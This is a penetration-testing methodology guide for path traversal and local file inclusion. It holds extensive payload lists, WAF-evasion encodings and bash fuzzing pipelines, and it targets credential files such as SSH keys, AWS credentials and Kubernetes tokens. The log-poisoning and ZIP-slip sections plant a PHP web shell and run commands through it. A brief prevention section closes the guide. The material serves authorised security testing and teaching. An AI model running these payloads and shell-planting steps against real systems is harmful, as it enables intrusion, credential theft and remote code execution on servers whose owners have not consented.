# Path Traversal (Directory Traversal / LFI)

> Comprehensive path traversal testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

Path traversal (directory traversal, LFI) allows attackers to access files and directories outside the intended folder by manipulating file path parameters using sequences like `../`. Based on OWASP Path Traversal, PortSwigger File Path Traversal labs, PayloadsAllTheThings (2026), and recent bypass trends (encoding tricks, path normalization bypasses, WAF evasion, chained with log poisoning, ZIP slip, and OOB exfiltration).

## Methodology

### 1. Target & Parameter Identification
- **Common vulnerable parameter names:** `file=`, `filename=`, `path=`, `filepath=`, `page=`, `template=`, `id=`, `name=`, `resource=`, `url=`, `download=`, `export=`, `img=`, `avatar=`, `photo=`, `document=`, `view=`, `load=`, `include=`, `require=`
- **Additional input sources:** Cookies (`TEMPLATE=`, `STYLE=`), POST body fields, JSON/XML parameters, multipart form data (filename field), HTTP headers (`X-Original-URL`, `X-Forwarded-Path`)
- **Context detection:** File download/export endpoints, image/avatar viewers, document/PDF previewers, template/theme loaders, log/config viewers, static file serving (`/static/`, `/assets/`), file include functions (PHP `include/require`), user‑uploaded content serving (ZIP slip)

### 2. Basic Traversal Payloads
- **Linux/Unix:** `../`, `../../`, `../../../etc/passwd`, `../../../../etc/passwd`
- **Windows:** `..\`, `..\\`, `..\..\..\windows\win.ini`, `..\..\..\..\windows\system32\drivers\etc\hosts`
- **Absolute paths:** `/etc/passwd`, `C:\Windows\win.ini`, `file:///etc/passwd`
- **Null byte termination (PHP <5.3):** `../../../etc/passwd%00`, `../../../etc/passwd%00.png`

### 3. Advanced Bypass & WAF Evasion (2025–2026)
- **Encoding tricks:** `%2e%2e%2f`, `%2e%2e%5c`, `%252e%252e%252f`, `%c0%ae%c0%ae%c0%af`, `%u002e%u002e%u002f`
- **Path mangling/normalization bypass:** `....//`, `....\\`, `..././`, `./../`, `..;/..;/`, `..%3b/..%3b/`, `..%2f..%2f..%2f`
- **Case & mixed case:** `../../Etc/Passwd`, `..%2F..%2Fetc%2Fpasswd`
- **Prepend known base path:** `/var/www/html/../../../etc/passwd`, `../../../../../var/www/images/../../../etc/passwd`
- **Windows‑specific:** `..%5c`, `..\\..\\`, `c:/windows/win.ini`, `\\localhost\c$\windows\win.ini` (UNC path)
- **Recent/exotic tricks:** Parsing discrepancies (WAFFLED‑style), HTTP parameter smuggling + traversal, header pollution, JSON‑wrapped payloads, nested/malformed `..//..//..//`

### 4. Target Files for Proof‑of‑Concept
- **Linux:** `/etc/passwd`, `/etc/issue`, `/etc/group`, `/etc/hosts`, `/proc/self/environ`, `/proc/self/cmdline`, `/proc/version`, `/proc/mounts`, `/proc/net/tcp`, `/var/www/html/index.php`, `config.php`, `.env`, `/var/log/apache2/access.log`
- **Windows:** `C:\Windows\win.ini`, `C:\Windows\system32\drivers\etc\hosts`, `C:\Windows\System32\config\SAM`, `web.config`, `App_Data\`, backup files
- **High‑value targets:** Kubernetes service account tokens (`/var/run/secrets/kubernetes.io/serviceaccount/token`), AWS credentials (`~/.aws/credentials`), SSH keys (`.ssh/id_rsa`), application secrets (`/.env`, `config/database.yml`)

### 5. Chained Exploitation
- **Log poisoning:** Inject PHP code into `User‑Agent` or `Referer`, then include log file for RCE
- **ZIP slip:** Upload malicious ZIP with traversal paths, extract to arbitrary location
- **Blind/OOB exfiltration:** Use DNS/HTTP callbacks when direct read blocked
- **File upload + traversal:** Write files via traversal to achieve RCE

## Tool Installation

```bash
# Core reconnaissance & fuzzing tools
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Path‑traversal‑specific tools
git clone https://github.com/wireghoul/dotdotpwn.git  # Classic traversal fuzzer
git clone https://github.com/deepakghengat/ADVANCED‑DIRECTORY‑TRAVERSAL‑PAYLOADS.git  # Payload collection

# Parameter discovery & manipulation
go install github.com/tomnomnom/gf@latest
go install github.com/tomnomnom/qsreplace@latest
go install github.com/tomnomnom/waybackurls@latest
```

## Testing Commands

### 1. Parameter Discovery & Enumeration

```bash
# GF pattern matching for LFI
gf lfi crawledurls.txt > gf-lfi.txt  # Extract LFI‑related URLs

# Custom pattern for file‑related parameters
grep -E "(file=|filename=|path=|filepath=|page=|template=|id=|name=|resource=|url=|download=|export=|img=|avatar=|photo=|document=|view=|load=|include=|require=)" crawledurls.txt | anew lfi-params-additional.txt

# Extract from JavaScript files
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo "(var|let|const)\s+\w+\s*=\s*['\"].*?['\"]" | cut -d'=' -f2 | tr -d " '\"" | grep -E "(file|path|template|page)" | sort -u > js-lfi-params.txt
```

### 2. Basic LFI Detection

```bash
# Test with classic /etc/passwd payload
cat gf-lfi.txt | qsreplace "/etc/passwd" | httpx -silent -match-string "root:x" | tee lfi-basic-hits.txt

# Test with Windows win.ini
cat gf-lfi.txt | qsreplace "..\\..\\..\\windows\\win.ini" | httpx -silent -match-string "\[fonts\]" | tee lfi-windows-hits.txt

# Test with null byte termination
cat gf-lfi.txt | qsreplace "../../../etc/passwd%00" | httpx -silent -match-string "root:x" | tee lfi-nullbyte-hits.txt
```

### 3. Advanced Bypass Testing

```bash
# Create payloads file with advanced bypasses
cat > lfi-payloads.txt << EOF
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
/etc/passwd
C:\Windows\win.ini
file:///etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%u002e%u002e%u002fetc%u002fpasswd
....//....//....//etc/passwd
....\\....\\....\\windows\\win.ini
..././..././..././etc/passwd
./.././.././../etc/passwd
..;/..;/..;/etc/passwd
..%3b/..%3b/..%3b/etc/passwd
..%2f..%2f..%2fetc%2fpasswd
../../Etc/Passwd
/var/www/html/../../../etc/passwd
../../../../../var/www/images/../../../etc/passwd
..%5c..%5c..%5cwindows%5cwin.ini
c:/windows/win.ini
\\localhost\c$\windows\win.ini
EOF

# Iterate through payloads
cat gf-lfi.txt | while read -r param_url; do
  while read -r payload; do
    echo "${param_url}${payload}"
  done < lfi-payloads.txt
done | httpx -silent -match-string "root:x\|\[fonts\]\|mysql\|apache\|/bin/bash" | tee lfi-advanced-hits.txt
```

### 4. Automated Fuzzing with FFUF

```bash
# Fuzz single parameter with wordlist
ffuf -u "https://target.com/download?file=FUZZ" -w /home/pwn/wordlists/LFI-Jhaddix.txt -fs 1234 -fc 403 -o ffuf-lfi.txt

# Fuzz multiple parameters
cat gf-lfi.txt | sed 's/=.*/=/' | sort -u | while read url; do
  ffuf -u "${url}FUZZ" -w /home/pwn/wordlists/LFI-Jhaddix.txt -fs 1234 -fc 403 -t 20
done
```

### 5. Dotdotpwn Automated Scanning

```bash
# Scan single host
dotdotpwn -m http -h https://target.com -k "root:x" -o dotdotpwn-report.txt

# Scan with custom payloads
dotdotpwn -m http -h https://target.com -f /path/to/payloads.txt -x 3 -o custom-report.txt
```

### 6. Nuclei Templates for Path Traversal

```bash
# Scan with nuclei path‑traversal templates
nuclei -u https://target.com -t ~/nuclei-templates/file‑traversal/ -o nuclei-lfi.txt

# Use specific tags
nuclei -u https://target.com -tags lfi,traversal -o nuclei-traversal-tagged.txt
```

### 7. Log Poisoning & RCE Chaining

```bash
# Poison access log with PHP code
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://target.com/"

# Include poisoned log via LFI
curl "http://target.com/page?file=/var/log/apache2/access.log&cmd=id"

# Automated log poisoning test
cat gf-lfi.txt | qsreplace "/var/log/apache2/access.log" | httpx -silent -match-string "system" | tee lfi-log-poison-hits.txt
```

### 8. ZIP Slip Testing (File Upload)

```bash
# Create malicious ZIP with traversal
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
zip -r malicious.zip ../../../../var/www/html/shell.php shell.php

# Upload ZIP and test extraction
curl -X POST -F "file=@malicious.zip" "http://target.com/upload"
curl "http://target.com/shell.php?cmd=id"
```

### 9. Blind / OOB Detection

```bash
# Use interactsh for blind detection
INTERACTSH="https://YOUR_ID.oast.pro"
cat gf-lfi.txt | qsreplace "$INTERACTSH" | httpx -silent -timeout 5

# Time‑based detection (large vs small file)
for url in $(cat gf-lfi.txt); do
  small_time=$(curl -s -o /dev/null -w "%{time_total}" "$(echo "$url" | qsreplace "/dev/null")")
  large_time=$(curl -s -o /dev/null -w "%{time_total}" "$(echo "$url" | qsreplace "/dev/zero")")
  if (( $(echo "$large_time - $small_time > 1.0" | bc -l) )); then
    echo "Possible blind LFI: $url"
  fi
done
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

- **Encoding variations:** Double/triple URL encoding, overlong UTF‑8, Unicode code points
- **Path normalization quirks:** `....//`, `..././`, `..;/` semicolon bypass
- **WAF evasion:** Mixed case, extra slashes, URL fragments, parameter pollution
- **Header‑based traversal:** `X‑Original‑URL`, `X‑Forwarded‑Path`
- **JSON/XML wrapped payloads:** `{"file":"../../../etc/passwd"}`
- **HTTP parameter smuggling:** CL.TE / TE.CL chained with traversal
- **Client‑side path traversal (CSPT):** JavaScript `fetch()` with user‑controlled paths

## Detection & Verification

- **File content appears** – e.g., `root:x:0:0:root` for `/etc/passwd`, `[fonts]` for `win.ini`
- **Different response length/status code** vs invalid file request
- **500 errors or permission errors** – may indicate partial traversal success
- **Blind indicators** – timing differences, OOB callbacks, side‑effects
- **PoC:** Screenshot of file contents, demonstration of log poisoning RCE, business impact

## Prevention (Developer View – OWASP Latest)

1. **Never pass user input directly to filesystem APIs** – use allow‑list of permitted files
2. **Canonicalize paths** (`realpath()`, `Path.GetFullPath()`) and check against base directory
3. **Use framework‑safe file APIs** – e.g., `send_file` with safe paths
4. **Run web app with least privilege** – non‑root user, restricted filesystem access
5. **Validate file extensions & content** – avoid null byte termination (upgrade PHP)
6. **Security headers** – `Content‑Security‑Policy`, `X‑Content‑Type‑Options`
7. **Regular security testing** – include path traversal checks in CI/CD pipelines

## References

- **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/Path‑Traversal.md](../Web‑Vulnerability‑Testing‑Checklist/Path‑Traversal.md)
- **PortSwigger File Path Traversal**: https://portswigger.net/web‑security/file‑path‑traversal
- **PayloadsAllTheThings – Directory Traversal**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
- **OWASP Path Traversal**: https://owasp.org/www‑community/attacks/Path_Traversal
- **Advanced bypass repos (2025+)**: DeepakGhengat, YesWeHack articles, recent CVEs

> **Happy (ethical) hunting** — path traversal remains a critical vulnerability leading to sensitive file disclosure, log poisoning RCE, and system compromise!